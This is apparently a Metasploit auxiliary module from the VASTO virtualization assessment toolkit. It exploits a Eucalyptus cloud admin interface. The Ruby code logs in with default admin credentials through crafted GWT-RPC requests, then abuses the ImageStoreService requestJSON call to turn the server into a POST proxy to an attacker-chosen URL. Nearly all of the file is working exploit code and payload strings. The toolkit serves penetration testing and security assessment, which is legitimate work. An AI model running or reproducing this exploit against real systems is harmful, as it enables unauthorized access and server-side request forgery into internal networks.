#################################################################
# 								#
#		This module is part of VASTO			#
#			Version 0.4				#
#		Virtualization ASsessment TOolkit		#
#								#
#################################################################

require 'msf/core'
require 'rexml/document'
require 'digest/md5'



class Metasploit3 < Msf::Auxiliary
  
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  
  def initialize
    super(
      'Name'        => 'EucalyptusBouncer',
      'Version'     => '0.1',
      'Description' => 'This module will exploit an unsafe usage of JSON requests to turn eucalyptus into a POST proxy',
      'Author'      => ['Claudio Criscione'],
      'License'     =>  GPL_LICENSE
    )
    deregister_options('VHOST')
    register_options(
      [
	OptString.new('USERNAME',[true, "A valid username for the system", "admin"]),
	OptString.new('PASSWORD',[true,"Password for the given username","admin"]),
	OptString.new('URL',[true,"URL to be contected","http://nourl"]),
	Opt::RPORT(8443),
	OptBool.new('SSL',   [true, 'Use SSL', true])
      ], self.class)    
    #TODO for this module: find a way to implement GET, not just POST - likely have to find the method ID for GET
  end
  
  def run
    begin
    port = datastore['RPORT']
    ip = datastore['RHOST']
    username = datastore['USERNAME']
    password = datastore['PASSWORD']    
    url = datastore['URL']
    
    sess = login(ip,port,username,password)
    if sess != false
      page = browse(ip,port,sess,url)
    else
      print_error('Invalid username or password');
    end
    
    puts page
    
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => rex_exep
      print_error "#{ rex_exep }"
    rescue ::Timeout::Error, ::Errno::EPIPE => other
      print_error "#{ other }"
    end
  end

  
 # Login, to retrieve a valid session ID, which is necessary for the exploit
  def login(ip,port,username,password)
    begin
      pwd = Digest::MD5.hexdigest(password)
      data = "5|0|7|https://#{ip}:#{port}/|D7EFDC90467EE4F9E6FBAB147FBBFD30|edu.ucsb.eucalyptus.admin.client.EucalyptusWebBackend|getNewSessionID|java.lang.String|#{username}|#{pwd}|1|2|3|4|2|5|5|6|7|"
      res = send_request_raw({
              'uri'     => '/EucalyptusWebBackend',
              'method'  => 'POST',
              'vhost'   => ip,
              'data'    => data,
              'headers' =>
        {
                  'Content-Length'  => data.length,
                  'Content-Type'    => 'text/x-gwt-rpc; charset=\"UTF-8\"',
        }
      }, -1)
      regex = Regexp.new(/"(.*)"/)
      matchdata = regex.match(res.body)
      if matchdata[1] == "com.google.gwt.user.client.rpc.SerializableException/3047383460\",\"Incorrect password"
	return false
      else 
	return matchdata[1]
      end
    end
  end
  

  
   # Retrieve the web page
  def browse(ip,port,sess,url)
    begin      
      data = "5|0|11|https://#{ip}:8443/|D9E37FD3148FA094448DA7797BAA61F2|edu.ucsb.eucalyptus.admin.client.extensions.store.ImageStoreService|requestJSON|java.lang.String|edu.ucsb.eucalyptus.admin.client.extensions.store.ImageStoreService$Method|[Ledu.ucsb.eucalyptus.admin.client.extensions.store.ImageStoreService$Parameter;|#{sess}|edu.ucsb.eucalyptus.admin.client.extensions.store.ImageStoreService$Method/4272089282|#{url}|[Ledu.ucsb.eucalyptus.admin.client.extensions.store.ImageStoreService$Parameter;/3900275228|1|2|3|4|4|5|6|5|7|8|9|1|10|11|0|"
      res = send_request_raw({
              'uri'     => '/ImageStoreService',
              'method'  => 'POST',
              'vhost'   => ip,
              'data'    => data,
              'headers' =>
        {
                  'Content-Length'  => data.length,
                  'Content-Type'    => 'text/x-gwt-rpc; charset=\"UTF-8\"',
        }
      }, -1)
      regex = Regexp.new(/\[\"(.*)\"\]/)
      matchdata = regex.match(res.body)
      return matchdata[1]
    end
  end
  
end
